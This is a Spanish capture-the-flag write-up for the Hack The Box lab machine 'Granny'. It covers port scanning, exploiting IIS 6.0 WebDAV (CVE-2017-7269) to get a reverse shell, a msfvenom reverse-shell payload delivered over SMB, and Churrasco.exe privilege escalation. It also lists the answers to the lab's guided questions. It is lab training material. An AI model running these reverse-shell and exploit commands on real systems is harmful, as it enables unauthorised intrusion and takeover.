---
title: Writeup granny - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - granny
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina granny en Hack The Box.
keywords:
  - writeup granny
  - hack the box granny
  - resolución máquina granny
  - granny hack the box
  - htb granny
---
----------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Windows/Granny)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=s_1LaGfKMkU)|[Parte2](https://www.youtube.com/watch?v=ul8bA5CgpfI)
- 🧠 **Explicación resumida**: 

---

#easy #windows #nmap #ping #churrascoexe #impacket-smbserver #CVE-2017-7269 #whatweb #wappalyzer #whoami #msfvenom #rwrapncnlvp443 

-------
# Guided Mode

1)¿Cuántos puertos TCP están abiertos en Granny?
	1

2)¿Cómo se llama el script de nmap que identifica los métodos HTTP permitidos en Granny?
	http-webdav-scan

3)¿Qué marco de aplicaciones web basado en DOTNET se está ejecutando en el servidor web de destino?
	ASP.NET

4)¿Qué método HTTP se puede utilizar para subir archivos a Granny?
	PUT

5)¿Cuál es el ID CVE 2017 de una vulnerabilidad que aprovecha esta versión de IIS y WebDAV, lo que da lugar a la ejecución remota de código?
	CVE-2017-7269

6)¿Qué módulo de reconocimiento de Metasploit se puede utilizar para enumerar las posibles rutas de escalada de privilegios en un sistema comprometido?
	local_exploit_suggester

----

# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.15
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.15 -oG allPorts
nmap -sC -sV -p80 10.10.10.15 -oN targetTCP
nmap -sU -Pn -n -vvv --top-ports 200 10.10.10.15 -oN targetUDP
```

![[Granny1.png]]

![[Granny2.png]]

![[Granny3.png]]
*TTL:* Maquina Windows
*Puertos TCP:*
	`80` HTTP
*Puertos UDP:*
	Demasiado ruido, no hay información relevante

-------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.10.15/
```

![[Granny5.png]]
![[Granny4.png]]
Lo impor tante es microsoft-IIS 6.0

---------
# [[CVE-2017-7269]]

Con [[git clone]] usamos el comando `git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269` para descargar el repositorio, despues con [[cd]] usamos `cd iis6-exploit-2017-CVE-2017-7269` y luego con ``python2.7 iis6\ reverse\ shell 10.10.10.15 80 10.10.16.15 443`` vamos a mandarnos la [[Reverse shell]] mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]]


![[Granny6.png]]

![[Granny7.png]]
Ya ganamos acceso a la maquina

--------
# Escalada de privilegios con [[Churrasco.exe]]

Usamos [[whoami]] con el comando `whoami /all`

![[Granny10.png]]
Vemos que *SeImpersonatePrivilege* esta activado
Se podria hacer un JuicyPotato pero como es un windows muy viejo vamos a usar la version anterior que es la de [[Churrasco.exe]]
Descargamos el exploit desde este [repositorio](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012/pr.exe)


### Con [[msfvenom]] vamos a crear el ejecutable *exploit.exe* para enviarnos una [[Reverse shell]]

```shell
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=500 -f exe -o exploit.exe
```
![[Granny19.png]]



Desde nuestra maquina de atacante, donde tenemos el ejecutable del [[Churrasco.exe]] vamos a levantar un [[impacket-smbserver]] con el comando `impacket-smbserver smbfolder $(pwd) -smb2support`
![[Granny18.png]]

Vamos a crear una carpeta llamada */tmp* en *C:* para poder tener permisos de escritura sin ningun tipo de problemas
Y desde la maquina victima vamos a descargar los archivos con `copy \\10.10.16.15\smbfolder\exploit.exe .` y `copy \\10.10.16.15\smbfolder\churrasco.exe .`
![[Granny15.png]]

Ejecutamos el [[Churrasco.exe]] pasandole el *exploit.exe* que creamos para enviarnos una [[Reverse shell]] con [[msfvenom]]

![[Granny14.png]]
Mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]] con el comando `rlwrap nc -nlvp 500` para enviarnos una [[Reverse shell]]
![[Granny12.png]]
Ya elevamos nuestro privilegio al maximo y podemos ver las flags

![[Granny16.png]]
![[Granny17.png]]

------
# Creditos

[Writeup jtsec](https://www.jtsec.es/blog-entry/61/road-to-oscp-hack-the-box-write-up-granny)
[Writeup binaryregion](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)